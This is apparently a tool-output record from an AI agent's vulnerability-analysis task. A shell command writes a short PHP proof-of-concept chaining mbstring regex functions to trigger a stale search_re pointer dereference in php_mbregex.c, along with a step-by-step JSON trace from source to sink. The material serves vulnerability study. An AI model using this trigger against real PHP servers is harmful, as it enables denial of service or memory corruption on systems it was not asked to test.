message:
Command `cd /workspace && cat > poc.php <<'EOF'
<?php
mb_ereg_search_init('abc', 'a');
mb_split('', '');
mb_ereg_search_regs('a');
mb_eregi_replace('a', '', 'a');
mb_ereg_search_regs('a');
?>
EOF
cat > candidate_trace.json <<'EOF'
[
{"step":1,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search_init)","line":1540,"var":"arg_str","code":"ZVAL_STR_COPY(&MBREX(search_str), arg_str);","note":"The attacker primes the persistent search subject used by the mbregex search state."},
{"step":2,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search_init)","line":1551,"var":"MBREX(search_re)","code":"if (argc > 1) { MBREX(search_re) = php_mbregex_compile_pattern(arg_pattern, arg_pattern_len, option, MBREX(current_mbctype), syntax); }","note":"The attacker also controls the regex object stored in the search_re global."},
{"step":3,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_split)","line":null,"var":"pattern","code":"mb_split('', '');","note":"An unrelated mbstring helper with an empty pattern exercises the module's shared regex cache and default-state handling."},
{"step":4,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_eregi_replace)","line":1224,"var":"pattern","code":"re = php_mbregex_compile_pattern(pattern, pattern_len, options, enc, syntax);","note":"The replacement API compiles a regex through the same cache and can trigger the aliasing edge that invalidates search_re."},
{"step":5,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"php_mbregex_compile_pattern","line":472,"var":"MBREX(search_re)","code":"if (rc == MBREX(search_re)) { /* reuse the new rc? see bug #72399 */ MBREX(search_re) = NULL; }","note":"Cache reuse clears the global search_re pointer and creates the stale-reference condition."},
{"step":6,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search_regs)","line":1607,"var":"MBREX(search_re)","code":"if (onig_number_of_names(MBREX(search_re)) > 0) { ... onig_foreach_name(MBREX(search_re), mb_regex_groups_iter, &args); }","note":"The final search_regs call dereferences the stale regex pointer during named-group iteration, which is the sink."}
]
EOF` executed with exit code 0.

